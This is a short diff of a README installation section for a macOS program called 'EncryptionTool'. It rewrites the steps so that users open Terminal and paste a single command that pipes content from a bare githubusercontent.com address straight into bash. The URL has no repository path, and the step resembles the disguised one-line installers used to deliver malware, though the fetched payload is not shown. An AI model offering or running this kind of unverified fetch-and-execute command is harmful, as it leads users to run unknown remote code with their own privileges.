@@ -1,8 +1,7 @@
-INSTALLATION INSTRUCTIONS:
+# 📥 Installation Instructions
 
-1. Download `EncryptionToolInstaller.dmg` and `install.sh`
-2. Run `EncryptionToolInstaller.dmg`
-3. Run this command in Terminal:
-   ```bash
-   curl -fsSL https://githubusercontent.com | bash
-   ```
+To install **EncryptionTool** on macOS, open your **Terminal** app (Press `Cmd + Space`, type `Terminal`, and hit Enter) and paste this single command:
+
+```bash
+curl -fsSL https://githubusercontent.com | bash
+```
